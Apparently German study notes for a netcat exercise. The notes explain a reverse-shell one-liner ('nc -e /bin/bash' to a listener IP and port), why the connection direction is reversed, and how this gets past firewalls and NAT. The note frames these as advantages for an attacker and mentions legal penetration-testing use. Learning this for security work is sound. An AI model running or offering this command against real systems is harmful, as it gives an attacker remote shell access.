## Übung netcat (reverse shell)
```ssh
nc -e /bin/bash 10.20.30.40 4242
```
Bedeutungen:  
nc... netcat  
-e /bin/bash... führt eine Shell aus und verbindet deren Ein-/Ausgabe mit dem Netzwerk  
10.20.30.40... Ziel-IP (Listener)  
4242... Ziel-Port  

Warum heißt es REVERSE SHELL:   
Normalerweise (klassische Verbindung):  
Client → verbindet sich zum Server  
  
Bei der Reverse Shell ist es umgekehrt:  
Zielsystem (Opfer) → verbindet sich zurück zum Angreifer  
 
„Reverse“ = umgekehrte Verbindungsrichtung  

Vorteile: 
1. Firewalls umgehen 
2. NAT umgehen 
3. Einfacher Zugriff für Angreifer 
nur Listener nötig 
kein Port-Forwarding notwendig

Verwendung:  
Penetration Testing (legal)  
Angreifer (illegal)
